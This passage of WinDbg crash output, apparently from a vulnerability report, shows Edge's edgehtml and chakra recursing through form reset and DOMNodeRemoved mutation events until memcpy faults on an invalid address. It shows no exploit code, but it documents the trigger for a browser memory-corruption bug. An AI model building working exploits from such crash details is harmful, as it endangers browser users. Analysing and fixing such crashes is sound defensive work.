01 00000002`9d8263c0 00007ffd`62e4b5bc msvcrt!memcpy_s+0x60
02 00000002`9d826400 00007ffd`62f0d87d edgehtml!Tree::TextData::Create+0x5c
03 00000002`9d826430 00007ffd`62c34c68 edgehtml!Tree::TreeWriter::NewTextNode+0x3d
04 00000002`9d826490 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x74
05 00000002`9d8264e0 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
06 00000002`9d826520 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
07 00000002`9d826610 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
08 00000002`9d826670 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
09 00000002`9d8266a0 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
0a 00000002`9d826770 00007ffd`625a8bc6 0x0000014f`68725919
0b 00000002`9d8267f0 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
0c 00000002`9d826840 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
0d 00000002`9d8268a0 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
0e 00000002`9d826990 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
0f 00000002`9d826a10 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
10 00000002`9d826a70 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
11 00000002`9d826b00 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
12 00000002`9d826ba0 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
13 00000002`9d826bf0 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
14 00000002`9d826c30 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
15 00000002`9d826d50 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
16 00000002`9d826de0 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
17 00000002`9d826f40 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
18 00000002`9d826f80 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
19 00000002`9d827290 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
1a 00000002`9d8272e0 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
1b 00000002`9d827450 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
1c 00000002`9d827480 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
1d 00000002`9d8275a0 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
1e 00000002`9d8275f0 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
1f 00000002`9d827630 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
20 00000002`9d827720 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
21 00000002`9d827780 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
22 00000002`9d8277b0 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
23 00000002`9d827880 00007ffd`625a8bc6 0x0000014f`68725919
24 00000002`9d827900 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
25 00000002`9d827950 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
26 00000002`9d8279b0 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
27 00000002`9d827aa0 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
28 00000002`9d827b20 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
29 00000002`9d827b80 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
2a 00000002`9d827c10 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
2b 00000002`9d827cb0 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
2c 00000002`9d827d00 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
2d 00000002`9d827d40 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
2e 00000002`9d827e60 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
2f 00000002`9d827ef0 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
30 00000002`9d828050 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
31 00000002`9d828090 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
32 00000002`9d8283a0 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
33 00000002`9d8283f0 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
34 00000002`9d828560 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
35 00000002`9d828590 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
36 00000002`9d8286b0 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
37 00000002`9d828700 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
38 00000002`9d828740 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
39 00000002`9d828830 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
3a 00000002`9d828890 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
3b 00000002`9d8288c0 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
3c 00000002`9d828990 00007ffd`625a8bc6 0x0000014f`68725919
3d 00000002`9d828a10 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
3e 00000002`9d828a60 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
3f 00000002`9d828ac0 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
40 00000002`9d828bb0 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
41 00000002`9d828c30 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
42 00000002`9d828c90 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
43 00000002`9d828d20 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
44 00000002`9d828dc0 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
45 00000002`9d828e10 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
46 00000002`9d828e50 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
47 00000002`9d828f70 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
48 00000002`9d829000 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
49 00000002`9d829160 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
4a 00000002`9d8291a0 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
4b 00000002`9d8294b0 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
4c 00000002`9d829500 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
4d 00000002`9d829670 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
4e 00000002`9d8296a0 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
4f 00000002`9d8297c0 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
50 00000002`9d829810 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
51 00000002`9d829850 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
52 00000002`9d829940 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
53 00000002`9d8299a0 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
54 00000002`9d8299d0 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
55 00000002`9d829aa0 00007ffd`625a8bc6 0x0000014f`68725919
56 00000002`9d829b20 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
57 00000002`9d829b70 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
58 00000002`9d829bd0 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
59 00000002`9d829cc0 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
5a 00000002`9d829d40 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
5b 00000002`9d829da0 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
5c 00000002`9d829e30 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
5d 00000002`9d829ed0 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
5e 00000002`9d829f20 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
5f 00000002`9d829f60 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
60 00000002`9d82a080 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
61 00000002`9d82a110 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
62 00000002`9d82a270 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
63 00000002`9d82a2b0 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
64 00000002`9d82a5c0 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
65 00000002`9d82a610 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
66 00000002`9d82a780 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
67 00000002`9d82a7b0 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
68 00000002`9d82a8d0 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
69 00000002`9d82a920 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
6a 00000002`9d82a960 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
6b 00000002`9d82aa50 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
6c 00000002`9d82aab0 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
6d 00000002`9d82aae0 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
6e 00000002`9d82abb0 00007ffd`625a8bc6 0x0000014f`68725919
6f 00000002`9d82ac30 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
70 00000002`9d82ac80 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
71 00000002`9d82ace0 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
72 00000002`9d82add0 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
73 00000002`9d82ae50 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
74 00000002`9d82aeb0 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
75 00000002`9d82af40 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
76 00000002`9d82afe0 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
77 00000002`9d82b030 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
78 00000002`9d82b070 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
79 00000002`9d82b190 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
7a 00000002`9d82b220 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
7b 00000002`9d82b380 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
7c 00000002`9d82b3c0 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
7d 00000002`9d82b6d0 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
7e 00000002`9d82b720 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
7f 00000002`9d82b890 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
80 00000002`9d82b8c0 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
81 00000002`9d82b9e0 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
82 00000002`9d82ba30 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
83 00000002`9d82ba70 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
84 00000002`9d82bb60 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
85 00000002`9d82bbc0 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
86 00000002`9d82bbf0 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
87 00000002`9d82bcc0 00007ffd`625a8bc6 0x0000014f`68725919
88 00000002`9d82bd40 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
89 00000002`9d82bd90 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
8a 00000002`9d82bdf0 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
8b 00000002`9d82bee0 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
8c 00000002`9d82bf60 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
8d 00000002`9d82bfc0 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
8e 00000002`9d82c050 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
8f 00000002`9d82c0f0 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
90 00000002`9d82c140 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
91 00000002`9d82c180 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
92 00000002`9d82c2a0 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
93 00000002`9d82c330 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
94 00000002`9d82c490 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
95 00000002`9d82c4d0 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
96 00000002`9d82c7e0 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
97 00000002`9d82c830 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
98 00000002`9d82c9a0 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
99 00000002`9d82c9d0 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
9a 00000002`9d82caf0 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
9b 00000002`9d82cb40 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
9c 00000002`9d82cb80 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
9d 00000002`9d82cc70 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
9e 00000002`9d82ccd0 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
9f 00000002`9d82cd00 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
a0 00000002`9d82cdd0 00007ffd`625a8bc6 0x0000014f`68725919
a1 00000002`9d82ce50 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
a2 00000002`9d82cea0 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
a3 00000002`9d82cf00 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
a4 00000002`9d82cff0 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
a5 00000002`9d82d070 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
a6 00000002`9d82d0d0 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
a7 00000002`9d82d160 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
a8 00000002`9d82d200 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
a9 00000002`9d82d250 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
aa 00000002`9d82d290 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
ab 00000002`9d82d3b0 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
ac 00000002`9d82d440 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
ad 00000002`9d82d5a0 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
ae 00000002`9d82d5e0 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
af 00000002`9d82d8f0 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
b0 00000002`9d82d940 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
b1 00000002`9d82dab0 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
b2 00000002`9d82dae0 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
b3 00000002`9d82dc00 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
b4 00000002`9d82dc50 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
b5 00000002`9d82dc90 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
b6 00000002`9d82dd80 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
b7 00000002`9d82dde0 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
b8 00000002`9d82de10 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
b9 00000002`9d82dee0 00007ffd`625a8bc6 0x0000014f`68725919
ba 00000002`9d82df60 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
bb 00000002`9d82dfb0 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
bc 00000002`9d82e010 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
bd 00000002`9d82e100 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
be 00000002`9d82e180 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
bf 00000002`9d82e1e0 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
c0 00000002`9d82e270 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
c1 00000002`9d82e310 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
c2 00000002`9d82e360 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
c3 00000002`9d82e3a0 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
c4 00000002`9d82e4c0 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
c5 00000002`9d82e550 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
c6 00000002`9d82e6b0 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
c7 00000002`9d82e6f0 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
c8 00000002`9d82ea00 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
c9 00000002`9d82ea50 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
ca 00000002`9d82ebc0 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
cb 00000002`9d82ebf0 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
cc 00000002`9d82ed10 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
cd 00000002`9d82ed60 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
ce 00000002`9d82eda0 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
cf 00000002`9d82ee90 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
d0 00000002`9d82eef0 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
d1 00000002`9d82ef20 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
d2 00000002`9d82eff0 00007ffd`625a8bc6 0x0000014f`68725919
d3 00000002`9d82f070 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
d4 00000002`9d82f0c0 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
d5 00000002`9d82f120 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
d6 00000002`9d82f210 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
d7 00000002`9d82f290 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
d8 00000002`9d82f2f0 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
d9 00000002`9d82f380 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
da 00000002`9d82f420 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
db 00000002`9d82f470 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
dc 00000002`9d82f4b0 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
dd 00000002`9d82f5d0 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
de 00000002`9d82f660 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
df 00000002`9d82f7c0 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
e0 00000002`9d82f800 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
e1 00000002`9d82fb10 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
e2 00000002`9d82fb60 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
e3 00000002`9d82fcd0 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
e4 00000002`9d82fd00 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
e5 00000002`9d82fe20 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
e6 00000002`9d82fe70 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
e7 00000002`9d82feb0 00007ffd`634517f2 edgehtml!CFormElement::DoReset+0x137
e8 00000002`9d82ffa0 00007ffd`6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
e9 00000002`9d830000 00007ffd`6256c191 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
ea 00000002`9d830030 0000014f`68725919 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
eb 00000002`9d830100 00007ffd`625a8bc6 0x0000014f`68725919
ec 00000002`9d830180 00007ffd`62484c7c chakra!amd64_CallFunction+0x86
ed 00000002`9d8301d0 00007ffd`62586999 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
ee 00000002`9d830230 00007ffd`62586872 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
ef 00000002`9d830320 00007ffd`625867b5 chakra!Js::JavascriptFunction::CallRootFunction+0x7e
f0 00000002`9d8303a0 00007ffd`62443d1b chakra!ScriptSite::CallRootFunction+0x6d
f1 00000002`9d830400 00007ffd`62446d66 chakra!ScriptSite::Execute+0x12b
f2 00000002`9d830490 00007ffd`62e40ae1 chakra!ScriptEngineBase::Execute+0xb6
f3 00000002`9d830530 00007ffd`62e40a08 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
f4 00000002`9d830580 00007ffd`62ee00a8 edgehtml!CJScript9Holder::ExecuteCallback+0x50
f5 00000002`9d8305c0 00007ffd`62edfdd5 edgehtml!CListenerDispatch::InvokeVar+0x258
f6 00000002`9d8306e0 00007ffd`62edfa07 edgehtml!CListenerDispatch::Invoke+0xbd
f7 00000002`9d830770 00007ffd`62d28d07 edgehtml!CEventMgr::_InvokeListeners+0x307
f8 00000002`9d8308d0 00007ffd`62e7707f edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
f9 00000002`9d830910 00007ffd`62c2df50 edgehtml!CEventMgr::Dispatch+0x5ef
fa 00000002`9d830c20 00007ffd`62d0ce3b edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
fb 00000002`9d830c70 00007ffd`62ee76a5 edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
fc 00000002`9d830de0 00007ffd`62f8e126 edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
fd 00000002`9d830e10 00007ffd`62c34c13 edgehtml!Tree::TreeWriter::RemoveNode+0x126
fe 00000002`9d830f30 00007ffd`638bb76e edgehtml!Tree::ElementNode::SetTextContent+0x1f
ff 00000002`9d830f80 00007ffd`638c0bbf edgehtml!OutputElement::DoReset+0x3e
0:019> r
rax=000001474c7dbfe0 rbx=000000000000000a rcx=000001474c7dbff2
rdx=ffffffffb9c1d00c rsi=00000147063f8ff4 rdi=000000000000000a
rip=00007ffd86fd3080 rsp=000000029d8263b8 rbp=0000014f68405a00
 r8=000000000000000a  r9=0000000000000001 r10=000001474c7dbfe0
r11=000001474c7dbfe8 r12=00007ffd6309fd30 r13=0000014728474890
r14=0000000000000000 r15=00007ffd63030790
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
msvcrt!memcpy+0x1c0:
00007ffd`86fd3080 488b440af8      mov     rax,qword ptr [rdx+rcx-8] ds:00000147`063f8ff6=????????????????

```

